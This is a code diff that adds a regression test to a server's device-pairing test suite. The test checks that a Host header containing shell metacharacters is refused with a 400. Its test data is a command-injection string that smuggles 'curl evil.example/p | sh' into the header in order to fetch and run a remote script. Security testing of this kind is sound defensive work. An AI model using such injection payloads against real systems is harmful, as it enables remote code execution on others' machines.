@@ -101,6 +101,29 @@ test("the auto-pair handshake: request → pending in /api/hosts → approve →
   assert.equal(ghost.status, 410, "unknown ids die the same way (no oracle)");
 });
 
+/* audit round 10 (B1): the pair-request route is the trust flow's SECOND
+   Host-embed point — it derives the serverUrl the approved poll hands back
+   to the installer's curl line from the same client-controlled header, so
+   its refusal gets the same pin as /i's. (Runs before the flood test below:
+   it spends from the same per-client creation budget.) */
+test("POST /api/pair/request with a metacharacter Host header refuses to embed it (400)", async () => {
+  const { request } = await import("node:http");
+  const hostile = "x'; curl evil.example/p | sh #'";
+  const status = await new Promise<number>((res, rej) => {
+    const req = request(
+      `${srv.base}/api/pair/request`,
+      { method: "POST", headers: { host: hostile, "content-type": "application/json" } },
+      (r) => {
+        r.resume();
+        res(r.statusCode ?? 0);
+      },
+    );
+    req.on("error", rej);
+    req.end(JSON.stringify({ hostname: "hostile-host-test", os: "linux" }));
+  });
+  assert.equal(status, 400, "a hostile Host must never be stored as the dial-home address");
+});
+
 test("deny answers the poll honestly; creation is rate-limited per client", async () => {
   const r2 = await postJson("/api/pair/request", { hostname: "denybox", os: "linux" }).then((r) => r.json());
   const denied = await postJson(`/api/pair/request/${r2.id}/deny`, {});
